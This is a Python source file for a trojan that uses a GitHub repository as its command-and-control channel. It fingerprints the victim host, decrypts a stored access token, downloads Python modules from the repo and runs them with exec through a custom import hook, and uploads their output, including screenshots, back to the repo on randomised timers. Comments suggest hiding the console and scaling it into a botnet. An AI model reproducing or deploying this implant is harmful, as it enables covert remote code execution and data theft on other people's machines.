import requests
import ast
import base64
import github3
import importlib
import json
import random
import sys
import threading
import time
import os
from Cryptodome.Cipher import PKCS1_OAEP
from Cryptodome.PublicKey import RSA
import ast
from datetime import datetime

## comment out the print statements to avoid commandline appearing

class SessionHandler:
	def __init__(self):
		pass
		
	def get_key(self):
		## might need to host the key over HTTPS instead, to decrypt the PAT. Using local address here was merely for convenience.
		## you could also host the key on another (but instead public) repo and pull from there, but you'd effectively be making your account open to anyone.
		imported_key_b64 = requests.get("http://127.0.0.1:8000/rsa_key.b64") 
		imported_key = base64.b64decode(imported_key_b64.text.strip().encode())
		self.rsa_key = RSA.import_key(imported_key)
		

	def decrypt_token(self):
		encrypted_token = b"<token here>"
		decryptor = PKCS1_OAEP.new(self.rsa_key)
		self.decrypted_token = decryptor.decrypt(ast.literal_eval(str(encrypted_token)))
		

	def connect_to_github(self):
		user = "username here"
		session = github3.login(token=self.decrypted_token.decode())
		self.connection = session.repository(user, 'reponame here')
		
		
		
class Trojan(SessionHandler):
	def __init__(self):
		self.get_id()
		self.config_file = 'config.json'
		self.data_path = f'data/{self.id}/'
		SessionHandler.__init__(self)
		
	def get_id(self):
		##to scale this up to botnet, might want to use additional data like IP public addresses here...
		if sys.platform.lower()=="linux":
			self.id = os.popen('whoami').read().strip()
			self.id += "_"
			self.id += os.popen('hostname').read().strip()
			self.id += "_"
			self.id += os.popen("hostname -I").read().strip()
		elif sys.platform.lower()=="windows":
			self.id = os.popen('whoami').read().strip()
			self.id += "_"
			self.id += "_"
			self.id += os.popen("ipconfig | findstr IPv4").read().strip().splitlines()[0].split(":")[1].strip()
			
	
	def get_file_contents(self, dirname, module_name):
		return self.connection.file_contents(f'{dirname}/{module_name}').content
	
	def get_config(self):
		config_json = self.get_file_contents(
			dirname = 'config', module_name=self.config_file
		)
		self.config = json.loads(base64.b64decode(config_json))
		
	
	def import_modules(self):
		for task in self.config:
			if task['module'] not in sys.modules:
				try:
					exec(f"import {task['module']}")
					print(f"[+] Imported {task['module']}")
				except Exception as ex:
					pass
					print(f"[!] Couldn't import {task['module']}")
					print(ex.__str__())
	def module_runner(self, module):
		try:
			result = sys.modules[module].run()
			self.store_module_result(result, module)
		except Exception as ex:
			pass
			print(f"[!] Couldn't run {module}")
			print(ex.__str__())
	
	
	def store_module_result(self, data, module):
		message = datetime.now().isoformat().replace(":","_").replace("-","_")
		remote_path = f'data/{self.id}/{message}_{module}.data'
		bin_data = bytes('%r'%data, 'utf-8')
		if module=="screenshot":
			self.connection.create_file(
				remote_path, message, data
			)
		else:
			self.connection.create_file(
				remote_path, message, bin_data
			)
	
	
	def ping_google(self):
		for i in range(10):
			requests.get("https://www.google.com")
			requests.get("https://www.facebook.com")
			requests.get("https://www.twitter.com")
			requests.get("https://www.linkedIn.com")
			time.sleep(5)
                
	def run(self):
		while True:
			config = self.get_config()
			self.import_modules()
			for task in self.config:
				thread = threading.Thread(
					target=self.module_runner,
					args=(task['module'],)
				)
				thread.start()
				time.sleep(random.randint(1, 10))
				#self.ping_google()
			time.sleep(random.randint(30*60, 3*60*60))
			

class GitImporter(Trojan):
	def __init__(self):
		self.current_module_code = ""
		Trojan.__init__(self)
		
	def find_module(self, name, path=None):
		print("[*] Attempting to retrieve %s" % name)
		self.get_key()
		self.decrypt_token()
		self.connect_to_github()
		new_library = self.get_file_contents('modules', f'{name}.py')
		if new_library:
			self.current_module_code = base64.b64decode(new_library)
			return self

	
	def load_module(self, name):
		spec = importlib.util.spec_from_loader(name, loader=None, origin=self.connection.git_url)
		new_module = importlib.util.module_from_spec(spec)
		exec(self.current_module_code, new_module.__dict__)
		sys.modules[spec.name] = new_module
		return new_module

	


if __name__=="__main__":
	sys.meta_path.append(GitImporter())
	
	trojan = Trojan()
	
	print("+ Getting rsa key")
	trojan.get_key()
	
	print("+ decrypting key")
	trojan.decrypt_token()
	
	print("+ connecting...")
	trojan.connect_to_github()
	
	trojan.run()
